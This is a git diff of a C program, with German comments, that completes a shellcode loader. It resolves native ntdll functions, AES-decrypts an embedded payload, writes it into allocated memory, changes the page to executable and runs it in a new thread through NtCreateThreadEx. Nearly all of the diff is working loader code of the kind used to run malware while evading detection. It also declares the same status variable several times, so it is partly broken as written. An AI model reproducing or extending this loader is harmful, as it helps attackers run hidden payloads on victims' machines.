@@ -43,6 +43,20 @@ typedef NTSTATUS(NTAPI* pNtFreeVirtualMemory)(
 	ULONG		FreeType
 	);
 
+typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
+    PHANDLE     ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    PVOID       ObjectAttributes,
+    HANDLE      ProcessHandle,
+    PVOID       StartRoutine,
+    PVOID       Argument,
+    ULONG       CreateFlags,
+    SIZE_T      ZeroBits,
+    SIZE_T      StackSize,
+    SIZE_T      MaximumStackSize,
+    PVOID       AttributeList
+    );
+
 //AES Struktur Bauen
 typedef struct _AES {
     PBYTE   pPlainText;             
@@ -214,6 +228,9 @@ int main() {
     pNtFreeVirtualMemory NtFreeVirtualMem = (pNtFreeVirtualMemory)
         GetProcAddress(ntdll, "NtFreeVirtualMemory");
 
+    pNtCreateThreadEx NtCreateThread = (pNtCreateThreadEx)
+        GetProcAddress(ntdll, "NtCreateThreadEx");
+
     if (!NtAllocateVirtualMem) {
         printf("NtAllocateVirtualMemory nicht gefunden\n");
         return 1;
@@ -244,13 +261,13 @@ int main() {
     getchar();
 
     printf("Entschluesseln...");
-    if (!SimpleDecryption(AesCipherText,sCipherSize, AesKey, AesIv, (PVOID*)&pDeobfuscatedPayload, (DWORD*)&sCipherSize)) {
+    if (!SimpleDecryption(AesCipherText, sCipherSize, AesKey, AesIv, (PVOID*)&pDeobfuscatedPayload, (DWORD*)&sCipherSize)) {
         printf("Enschlüsselung fehlgeschlagen");
     }
     printf("Druecke Enter um Speicher zu allokieren");
     getchar();
 
-    PVOID pShellcodeAddress = NtAllocateVirtualMem(
+    NTSTATUS status = NtAllocateVirtualMem(
         hProc,
         &base,
         0,
@@ -259,18 +276,67 @@ int main() {
         PAGE_READWRITE
     );
 
-    if (pShellcodeAddress == NULL) {
+    if (!NT_SUCCESS(status)) {
         printf("NtAllocateVirtaulMemory fehlgeschlagen mit Error : %d \n", GetLastError());
         return -1;
     }
 
-    printf("Shellcode sitzt an Adresse 0x%p\n", pShellcodeAddress);
+    printf("Shellcode sitzt an Adresse 0x%p\n", base);
     printf("Druecke Enter um in den Speicher zu schreiben");
     getchar();
 
+    NTSTATUS status = NtWriteVirtualMem(
+        hProc,
+        base,
+        pDeobfuscatedPayload,
+        sCipherSize,
+        NULL
+    );
 
+    if (!NT_SUCCESS(status)) {
+        printf("NtWriteMemory fehlgeschlagen: 0x%08X\n", status);
+        return -1;
+    }
 
+    printf("[+] Shellcode erfolgreich in den speicher geschrieben bei: ox%p\n", base);
+    printf("[+] Berechtigungen des Speichers werden geändert\n");
 
+    ULONG dwOldProtection = NULL;
+    NTSTATUS status = NtProtectVirtualMem(
+        hProc,
+        &base,
+        &PageSize,
+        PAGE_EXECUTE_READ,
+        &dwOldProtection
+    );
 
+    if (!NT_SUCCESS(status)) {
+        printf("[!] NtProtectVirtualMemory fehlgeschlagen: 0x%08X\n", status);
+        return -1;
+    }
+    printf("[+] Speicherrechte erfolgreich auf RX umgeschreiben\n");
+    printf("[i] Druecke Enter um einen Thread zu erstellen\n");
+    getchar();
+
+    HANDLE hThread = NULL;
+
+    NTSTATUS status = NtCreateThread(
+        &hThread,
+        THREAD_ALL_ACCESS,
+        NULL,
+        GetCurrentProcess(),
+        base,
+        NULL,
+        FALSE,
+        0,
+        0,
+        0,
+        NULL
+    );
+
+    if (!NT_SUCCESS(status)){
+        printf("NtCreateThread Fehlgeschlagen: 0x%08X\n", status);
+        return -1;
+        }
 
 }
